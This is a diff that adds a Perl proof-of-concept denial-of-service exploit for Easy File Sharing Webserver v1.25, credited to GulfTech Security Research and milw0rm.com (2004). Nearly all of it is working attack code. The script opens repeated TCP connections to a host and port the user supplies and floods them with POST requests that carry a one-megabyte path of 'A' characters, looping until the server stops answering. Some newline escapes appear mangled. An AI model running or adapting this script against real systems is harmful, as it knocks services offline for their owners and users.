@@ -1,0 +1,42 @@
+##################################################### 
+# Easy File Sharing Webserver v1.25 Denial Of Service 
+# Proof Of Concept Code By GulfTech Security Research 
+##################################################### 
+# Easy File Sharing Webserver v1.25 will consume 99% 
+# of CPU usage until it crashes when sent large req's 
+##################################################### 
+
+use IO::Socket; 
+
+print "=====================================================n". 
+      " Easy File Sharing Webserver v1.25 Denial Of Service n". 
+  "=====================================================n"; 
+
+unless (@ARGV > 1) { die("usage: efswsdos.pl host port"); } 
+
+my $remote_host = $ARGV[0]; 
+my $remote_port = $ARGV[1]; 
+my $done = "15121512"; 
+my $buff = "A" x 1000000; 
+my $post = "POST /".$buff." HTTP/1.0 ".$done; 
+
+print "
+DoS'ing Server $remote_host Press ctrl+c to stopn"; 
+
+while ($post) { 
+for (my $i=1; $i<10; $i++) { 
+my $i = IO::Socket::INET->new( Proto => "tcp", 
+      PeerAddr   => $remote_host, 
+  PeerPort   => $remote_port, 
+      Timeout   => '10000', 
+      Type       => SOCK_STREAM, 
+      ) || die("
+Server Is Dead!"); 
+
+print $i $post; 
+$i->autoflush(1); 
+  } 
+} 
+close $i; 
+
+# milw0rm.com [2004-08-27]
